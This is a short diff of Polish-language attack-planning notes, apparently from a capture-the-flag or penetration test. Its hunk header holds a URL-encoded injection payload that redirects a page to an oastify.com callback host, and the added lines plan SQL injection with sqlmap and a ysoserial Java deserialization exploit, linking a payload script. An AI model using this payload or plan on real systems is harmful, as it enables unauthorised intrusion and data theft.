@@ -32,3 +32,11 @@ find=%22};%20location=%22https://n8w2f9euhi8b4hrh4s7oevklwc23qwel.oastify.com/?%
 
 
 
+
+stage 2:
+if sqlmap - gotowe komendy z neta lub sqlmap 
+
+stage 3:
+zweryfikować ysoserail exploit
+https://github.com/ossamayasserr/ysoserial-all-payloads/blob/main/script_java_object_exploits_base64.py
+
